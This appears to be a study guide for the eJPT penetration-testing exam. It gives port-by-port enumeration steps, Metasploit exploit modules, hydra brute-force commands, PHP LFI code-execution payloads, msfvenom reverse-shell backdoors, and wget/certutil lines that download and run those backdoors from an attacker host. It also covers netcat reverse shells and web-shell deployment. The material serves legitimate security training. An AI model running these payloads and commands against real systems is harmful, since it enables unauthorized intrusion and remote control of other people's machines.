# Summary
This strategic guide provides mandatory protocols for the exam's unique constraints and uses OODA-based troubleshooting loops to follow best-practice operations and overcome common "stuck" points in reconnaissance, exploitation, and pivoting.

# Before the Beginning

This section provides a high-level OODA loop to guide the entire 48-hour examination.

- Observe (Observe the battlefield) — first 30 minutes
  - Read all 35 questions
  - Read and comprehend the core table (minimum pass mark)
  - Read and internalize the examination constraints (no internet access, dynamic Flags)

- Orient (Adjust mindset) — most critical strategic step
  - The exam is not a "pwn-all-machines" CTF. It is a "document-all-findings" audit.
  - Meticulous enumeration and documentation outweigh exploitation.

- Decide (Establish Engagement Rules)
  - Follow a problem-driven attack model. These 35 issues form the map.
  - Adopt a dual-brain strategy and flag submission protocol as mandatory, inviolable rules.
  - Do not become bogged down on a single exploit for more than 30 minutes. Pivot to alternative targets, gathering additional assessment score points which (with a minimum threshold of 90%) hold greater value than exploitation (minimum threshold of 70%).

- Act (Execution)
  - Enter the second phase (tactical setup and reconnaissance) with this reinforced, resilient mindset.

| Domain                        | Weight | Key Skills                                                                                                                    | Minimum Score |
| ----------------------------- | ------ | ----------------------------------------------------------------------------------------------------------------------------- | ------------- |
| Assessment Methodologies      | 25%    | Host discovery (`nmap -sn`), port/service/OS identification (`nmap -sV -sC -O`), vulnerability identification (`searchsploit`) | 90%           |
| Host & Network Auditing       | 25%    | System/user enumeration, credential dumping, file transfer                                                                    | 80%           |
| Host & Network Penetration    | 35%    | Exploitation (Metasploit Framework), brute force (hydra), pivoting                                                            | 70%           |
| Web Application               | 15%    | Directory enumeration (gobuster), CMS scanning (wpscan), SQL injection, cross-site scripting                                  | 60%           |

# Tactical Deployment and Reconnaissance

## Metasploit Framework Initiation and Verification Workflow

The Metasploit database serves as the core strategic tool for managing operational cognitive load.

```bash
service postgresql start && msfconsole
msf6 > db_status
msf6 > workspace -a lab
```

## Network and Service Reconnaissance

The objective at this stage is to construct a comprehensive map of the network.

### Host Discovery

```bash
nmap -sn <target_ip_range>
```

### Service and Port Scanning

```bash
nmap -sV -sC -O -p- <target_ip> -oX v_<target_ip>.xml
```

### Import Nmap Results into Metasploit

```text
msf6 > db_import v_<target_ip>.xml
msf6 > hosts
msf6 > setg RHOSTS <target_ip>
msf6 > setg RHOST <target_ip>
```

## The OODA Loop in the Reconnaissance Phase (Troubleshooting)

### Issue 1

- Orient (Positioning issue): `nmap -sn` scan shows zero hosts, or `nmap -sV` scan indicates all ports are "filtered".
- Decide (Determine Diagnostic Action):
  1. Re-Orient (Tool Failure): `nmap -sn` (ICMP Ping) is frequently blocked by firewalls. `nmap -sV` (default SYN scan) may also be blocked.
  2. Re-Decide (Switch Tools)
- Act:
  1. Use `sudo arp-scan -I eth0 <RANGE>`. ARP operates at Layer 2 and is virtually unfiltered on the local subnet. This is the most reliable host discovery method.
  2. For port scanning, switch to a full TCP Connect scan: `nmap -sT -Pn <target_ip>`. `-sT` is noisier but more reliable against simple firewalls. `-Pn` skips (potentially failing) host discovery pings.
- Re-Orient (Self-Check): Is your own machine configured correctly? Check `ip a` on Kali. Are you on the correct VPN interface (`tun0`)? Are you scanning the correct subnet?

# Attack Playbook (Enumeration and Exploitation)

## Port 21: FTP

### Scan

```bash
nmap -p 21 --script=ftp-anon <target_ip>
```

### Manual Enumeration

```bash
ftp <target_ip>
```
- Use `anonymous` as username and empty password to log in.

### MSF Enumeration

```text
msf6 > use auxiliary/scanner/ftp/anonymous
```

### Exploitation

- If Nmap results indicate "Anonymous FTP login permitted" with write access (WA WRITE), proceed immediately to payload delivery using `put shell.exe`.
- If banner = `vsftpd 2.3.4`:
  ```text
  msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
  ```
- If banner = `ProFTPD 1.3.3c`:
  ```text
  msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
  ```
- Brute force:
  ```bash
  hydra -L <user_file> -P <password_file> ftp://<target_ip>
  ```

## Port 22: SSH

### Scan

```bash
nmap -p 22 --script=ssh-auth-methods <target_ip>
```

### Manual Enumeration

```bash
nc -nv <target_ip> 22
```

### Exploitation

- If banner contains `libssh`:
  ```text
  msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
  ```
- Brute force:
  ```bash
  hydra -L <user_file> -P <password_file> ssh://<target_ip>
  ```

## Port 80/443: HTTP/S

### Scan

```bash
nmap -p 80,443 --script=http-* <target_ip>
```

### File/Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,git
```

- Web Reconnaissance Quick Checklist
  - After running Gobuster, manually inspect the following common files and directories (key sources of information within the eJPT practice lab):
    - robots.txt: Examine the `Disallow:` entries, which typically point to hidden administrative pages.
    - wp-config.php/wp-config.bak: Often contain plaintext database credentials.
    - phpinfo.php: Leaks detailed PHP configuration and server variables.

### CMS Scan

```bash
wpscan --url http://<target_ip> --enumerate u,p,t,vp
```

- Options reference:
  - `--url <URL>`: Target URL
  - `--enumerate p`: Enumerate popular plugins
  - `--enumerate ap`: Enumerate all plugins (takes considerable time)
  - `--enumerate t`: Enumerate popular themes
  - `--enumerate at`: Enumerate all themes
  - `--enumerate vp`: Enumerate vulnerable plugins (most commonly used)

### WebDAV Enumeration

```bash
davtest -url http://<target_ip>/webdav
```

### MSF Enumeration

```text
msf6 > use auxiliary/scanner/http/dir scanner
msf6 > use auxiliary/scanner/http/http_put
```

### Exploitation

- If `auxiliary/scanner/http/http_put` reports "PUT is allowed"
    ```text
    msf6 > use exploit/windows/iis/iis_webdav_upload_asp
    ```

- If Banner = "HTTP File Server 2.3x" 
    ```text
    msf6 > use exploit/windows/http/rejetto_hfs_exec
    ```

- If Banner = "BadBlue 2.72b"
    ```text
    msf6 > use exploit/windows/http/badblue_passthru
    ```

- If obtain Tomcat Management Credentials
    ```text
    msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass 
    ```

- If find Local File Inclusion and Remote File Inclusion
    Switch to the LFI/RFI & Web Attack Payloads Quick Reference Guide

### LFI/RFI & Web Attack Payloads

- RCE via GET payload
  ```bash
  curl "http://<target_ip>/<vuln_php_page>?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=<command>"
  ```
- RCE via POST payload
  ```bash
  curl -X POST "http://<target_ip>/<vuln_php_page>?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" --data-binary "<?php system('<command>'); ?>"
  ```

### Brute Force

```bash
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<failed_message>"
```

- Parameter Description
    - `username` and `password` is the value name defined by web application, and they can be various in different website, e.g. some sites use `user` and `password`.
    -  `^USER^` and `^PASS^`: Hydra placeholders.
    - `F=<failed_message>`: `F=` specifies the distinctive string returned on the page following a failed login.

## Port 139/445: SMB

### Scan

```bash
nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-protocols <target_ip>
```

### Automatic Enumeration

```bash
enum4linux -a <target_ip>
```

- Options reference:
    - `-a`: Run all enumerations (legacy).
    - `-U`: Enumerate users.
    - `-S`: Enumerate shares.
    - `-G`: Enumerate groups and members.
    - `-r`: RID cycling (used to find users).

### Manual Enumeration

```bash
smbmap -H <target_ip>: (Empty session) List shares and permissions.
smbmap -H <target_ip> -u <user> -p <pass>: List shares and permissions using credentials。
smbmap -H <target_ip> -r <share>: Recursively list shared memory
```

### Exploitation

- If smb enumshares detects anonymous writable shares (ANON WRITE) 

    ```bash
    smbclient //<target_ip>/<ShareName> -N
    put shell.exe
    ```

- If Banner = "Samba 3.5.0-4.6.4" and have a writable share

    ```text
    msf6 > use exploit/linux/samba/is_knwon_pipename
    ```

- If brute force attack succeed (admin user only)

    ```text
    msf6 > use exploit/windows/smb/psexec
    ```

- If brute force attack succeed (but not admin user)

    ```bash
    smbclient //<target_ip>/<ShareName> -U 'username%password'
    put shell.exe
    ```

### Brute Force

```bash
hydra -L <user_file> -P <password_file> //<target_ip> smb
```

## Port 3306: MySQL

### Scan

```bash
nmap -p 3306 --script mysql-info <target_ip>
```

### Brute Force

```bash
hydra -L <user_file> -P <password_file> //<target_ip> mysql
```

## Payload Generation and Delivery

### MSFVenom Payloads Generation

- Linux (ELF)
  ```bash
  msfvenom -p linux/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f elf -o backdoor.elf
  ```
- Windows (EXE)
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f exe -o backdoor.exe
  ```

### Built-in Payloads on Kali

Kali ships ready-to-use web shells and binaries under /usr/share. Below are the most exam-relevant items.

#### Web Shells

- PHP reverse shell
  - Path: `/usr/share/webshells/php/php-reverse-shell.php`
  - OODA:
    - Observe: PHP web server; file upload found.
    - Orient: Reverse shell needed (outbound usually allowed).
    - Decide: Use bundled php-reverse-shell.php.
    - Act:
      1. Copy this file.
      2. Edit the file: set ip and port variables to your Kali IP (LHOST) and listening port (LPORT).
      3. Upload the modified file.
      4. Start listener on Kali: `nc -lvnp <LPORT>` or use the Metasploit `/multi/handler` module.
      5. Browse to the uploaded PHP file to trigger the shell.

- ASPX command shell
  - Path: `/usr/share/webshells/aspx/cmdasp.aspx`
  - OODA:
    - Observe: IIS/.aspx; file upload exists.
    - Orient: Simple HTTP web shell is often more reliable than reverse shell.
    - Decide: Upload cmdasp.aspx for initial exec.
    - Act:
      1. Upload.
      2. Browse to it.
      3. Run commands: `http://<target_ip>/uploads/cmdasp.aspx?cmd=whoami`.
      4. Use foothold to fetch a more robust shell.

- JSP reverse shell
  - Path: `/usr/share/webshells/jsp/jsp-reverse.jsp`
  - OODA:
    - Observe: Tomcat/Java service; upload or manager creds.
    - Orient: Deploy a WAR containing the JSP shell.
    - Decide: Package and deploy JSP shell.
    - Act:
      1. Modify `jsp-reverse.jsp` with LHOST and LPORT.
      2. Create a directory (e.g., `shell/`) and place the JSP inside it.
      3. Package as WAR:
         - `jar -cvf shell.war -C shell .`
         - or `zip -r shell.war shell/`
      4. Deploy `shell.war` via the Tomcat Manager console.
      5. Start a listener on Kali: `nc -lvnp <LPORT>`.
      6. Open `http://<target_ip>/shell/jsp-reverse.jsp` to trigger the shell.

#### Windows Binaries

- Netcat (nc.exe)
  - Path: `/usr/share/windows-resources/binaries/nc.exe`
  - OODA:
    - Observe: Have RCE but no interactive shell.
    - Orient: nc.exe supports `-e` to attach cmd.exe.
    - Decide: Use nc.exe for a reverse shell.
    - Act:
      1. Serve file (e.g., `python3 -m http.server`).
      2. Start listener: `nc -lvnp <port>` (or Metasploit multi/handler).
      3. Execute on target: `C:\\Windows\\Temp\\nc.exe <attack_ip> <port> -e cmd.exe`.

### Payload Delivery

- HTTP server on attacker
  ```bash
  python3 -m http.server 8080
  ```
- Linux victim: download + execute
  ```bash
  wget http://<attack_ip>/backdoor.elf -O /tmp/backdoor.elf && chmod +x /tmp/backdoor.elf && /tmp/backdoor.elf
  ```
- Windows victim: download + execute
  ```cmd
  certutil -urlcache -split -f http://<attack_ip>/backdoor.exe C:\\Windows\\Temp\\backdoor.exe && C:\\Windows\\Temp\\backdoor.exe
  ```
- Via SMB
  ```bash
  smbclient //<target_ip>/<ShareName> -N
  put backdoor.exe
  # or
  smbclient //<target_ip>/<ShareName> -U 'username%password'
  put backdoor.exe
  ```
- Via FTP
  ```bash
  ftp <target_ip>
  binary
  put backdoor.exe
  ```

### Payload Troubleshooting

- Step 1: Staged vs. stageless
  - Staged (…/meterpreter/reverse_tcp): small loader then downloads stage; needs two connections.
  - Stageless (…/meterpreter_reverse_tcp): self-contained; one connection.
  - If staged fails, switch to stageless first.

- Step 2: Architecture (x64 vs. x86)
  - Detect: Windows: `systeminfo | findstr /C:"System Type"`; Linux: `uname -m`.
  - Rule: x86 payload runs on x64; x64 payload will not run on x86.
  - Errors like “exec format error”/“Not a valid Win32 application” imply mismatch. Default to x86 unless you need x64.

- Step 3: Connection type (reverse vs. bind)
  - Default: reverse shell. If LPORT 4444 fails, try `80`, then `443`.
  - Consider bind shell only if outbound is blocked and an inbound port is reachable.

- Step 4: Meterpreter vs. standard shell
  - If Meterpreter dies/stalls, switch to standard shell for stability:
    ```text
    msf6 > set PAYLOAD windows/shell_reverse_tcp
    msf6 > exploit
    ```
  - Upgrade later if needed:
    ```text
    msf6 > background
    msf6 > use post/multi/manage/shell_to_meterpreter
    msf6 > set SESSION 1
    msf6 > run
    ```

This uses the stable shell (Session 1) to upload and run a new Meterpreter payload, yielding a fresh Meterpreter session (Session 2) with higher reliability.

